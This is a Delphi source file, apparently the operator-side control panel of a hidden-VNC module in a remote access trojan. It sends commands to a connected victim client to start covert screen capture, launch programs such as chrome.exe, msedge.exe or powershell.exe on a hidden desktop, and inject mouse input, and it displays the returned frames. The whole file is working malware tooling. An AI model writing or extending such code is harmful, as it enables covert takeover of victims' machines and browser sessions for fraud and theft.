unit UnitHiddenVNC;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.ExtCtrls, Vcl.StdCtrls, System.JSON, ncLines;

type
  TJSONSendProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterProc = procedure(aLine: TncLine) of object;

  TForm10 = class(TForm)
    PaintBox1: TPaintBox;
    StatusBar1: TStatusBar;
    Panel1: TPanel;
    Button1: TButton;
    ComboBox1: TComboBox;
    ComboBox2: TComboBox;
    Button2: TButton;
    Button3: TButton;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure PaintBox1Paint(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure PaintBox1MouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
    procedure PaintBox1MouseDown(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
    procedure PaintBox1MouseUp(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
  private
    FLine: TncLine;
    FClientID: string;
    FSendJSON: TJSONSendProc;
    FOnUnregister: TUnregisterProc;
    FLastFrame: TBitmap;
    FIsCapturing: Boolean;

    procedure SendHVNCCommand(const Action: string; Params: TJSONObject = nil);
    procedure LogToStatus(const Msg: string);
  public
    procedure SetupForClient(aLine: TncLine; const ClientID: string;
      ASendProc: TJSONSendProc; AUnregisterProc: TUnregisterProc);
    procedure DetachCallbacks;
    procedure HandleHiddenVNCJSON(JSONObj: TJSONObject);
    procedure QueueFrameBytes(const Bytes: TBytes);
  end;

var
  Form10: TForm10;

implementation

{$}R *.dfm}

uses
  Vcl.Imaging.jpeg;

procedure TForm10.FormCreate(Sender: TObject);
begin
  FLastFrame := TBitmap.Create;
  FIsCapturing := False;

  ComboBox1.Items.Clear;
  ComboBox1.Items.Add('10%');
  ComboBox1.Items.Add('20%');
  ComboBox1.Items.Add('50%');
  ComboBox1.Items.Add('80%');
  ComboBox1.Items.Add('100%');
  ComboBox1.ItemIndex := 2;

  ComboBox2.Items.Clear;
  ComboBox2.Items.Add('chrome.exe');
  ComboBox2.Items.Add('msedge.exe');
  ComboBox2.Items.Add('powershell.exe');
  ComboBox2.ItemIndex := 0;
end;

procedure TForm10.FormDestroy(Sender: TObject);
begin
  FLastFrame.Free;
end;

procedure TForm10.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if FIsCapturing then
    Button1Click(nil);

  if Assigned(FOnUnregister) then
    FOnUnregister(FLine);
  Action := caFree;
end;

procedure TForm10.SetupForClient(aLine: TncLine; const ClientID: string;
  ASendProc: TJSONSendProc; AUnregisterProc: TUnregisterProc);
begin
  FLine := aLine;
  FClientID := ClientID;
  FSendJSON := ASendProc;
  FOnUnregister := AUnregisterProc;
  Caption := 'Hidden VNC - ' + ClientID;
end;

procedure TForm10.DetachCallbacks;
begin
  FSendJSON := nil;
  FOnUnregister := nil;
end;

procedure TForm10.LogToStatus(const Msg: string);
begin
  StatusBar1.SimpleText := Msg;
end;

procedure TForm10.SendHVNCCommand(const Action: string; Params: TJSONObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FSendJSON) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', Action);
    if Assigned(Params) then
    begin
      while Params.Count > 0 do
      begin
        var Pair := Params.Pairs[0];
        Params.RemovePair(Pair.JsonString.Value);
        JSONObj.AddPair(Pair);
      end;
      Params.Free;
    end;
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm10.Button1Click(Sender: TObject);
var
  Params: TJSONObject;
  Quality: Integer;
begin
  if not FIsCapturing then
  begin
    Params := TJSONObject.Create;
    Quality := StrToIntDef(StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]), 50);
    Params.AddPair('quality', TJSONNumber.Create(Quality));
    SendHVNCCommand('hvnc_start', Params);
    Button1.Caption := 'Stop Capture';
    FIsCapturing := True;
    LogToStatus('Starting capture...');
  end
  else
  begin
    SendHVNCCommand('hvnc_stop');
    Button1.Caption := 'Start Capture';
    FIsCapturing := False;
    LogToStatus('Capture stopped.');
  end;
end;

procedure TForm10.Button2Click(Sender: TObject);
var
  Params: TJSONObject;
begin
  Params := TJSONObject.Create;
  Params.AddPair('path', ComboBox2.Text);
  SendHVNCCommand('hvnc_run', Params);
  LogToStatus('Running ' + ComboBox2.Text + '...');
end;

procedure TForm10.Button3Click(Sender: TObject);
var
  Path: string;
  Params: TJSONObject;
begin
  if InputQuery('Custom Process', 'Enter full path to process:', Path) then
  begin
    Params := TJSONObject.Create;
    Params.AddPair('path', Path);
    SendHVNCCommand('hvnc_run', Params);
    LogToStatus('Running ' + Path + '...');
  end;
end;

procedure TForm10.HandleHiddenVNCJSON(JSONObj: TJSONObject);
var
  Action: string;
begin
  Action := JSONObj.GetValue('action').Value;
  if Action = 'hvnc_status' then
    LogToStatus(JSONObj.GetValue('message').Value)
  else if Action = 'hvnc_error' then
    LogToStatus('Error: ' + JSONObj.GetValue('error').Value);
end;

procedure TForm10.QueueFrameBytes(const Bytes: TBytes);
var
  MS: TMemoryStream;
  JPG: TJPEGImage;
begin
  MS := TMemoryStream.Create;
  try
    MS.WriteBuffer(Bytes[0], Length(Bytes));
    MS.Position := 0;

    JPG := TJPEGImage.Create;
    try
      JPG.LoadFromStream(MS);
      TThread.Synchronize(nil, procedure begin
        FLastFrame.Assign(JPG);
        PaintBox1.Invalidate;
      end);
    finally
      JPG.Free;
    end;
  finally
    MS.Free;
  end;
end;

procedure TForm10.PaintBox1Paint(Sender: TObject);
begin
  if not FLastFrame.Empty then
    PaintBox1.Canvas.StretchDraw(PaintBox1.ClientRect, FLastFrame);
end;

procedure TForm10.PaintBox1MouseDown(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
var
  Params: TJSONObject;
begin
  Params := TJSONObject.Create;
  Params.AddPair('event', 'down');
  Params.AddPair('button', TJSONNumber.Create(Ord(Button)));
  Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)));
  Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)));
  SendHVNCCommand('hvnc_mouse', Params);
end;

procedure TForm10.PaintBox1MouseMove(Sender: TObject; Shift: TShiftState; X, Y: Integer);
var
  Params: TJSONObject;
begin
  if not FIsCapturing then Exit;
  Params := TJSONObject.Create;
  Params.AddPair('event', 'move');
  Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)));
  Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)));
  SendHVNCCommand('hvnc_mouse', Params);
end;

procedure TForm10.PaintBox1MouseUp(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
var
  Params: TJSONObject;
begin
  Params := TJSONObject.Create;
  Params.AddPair('event', 'up');
  Params.AddPair('button', TJSONNumber.Create(Ord(Button)));
  Params.AddPair('x', TJSONNumber.Create(MulDiv(X, 65535, PaintBox1.Width)));
  Params.AddPair('y', TJSONNumber.Create(MulDiv(Y, 65535, PaintBox1.Height)));
  SendHVNCCommand('hvnc_mouse', Params);
end;

end.
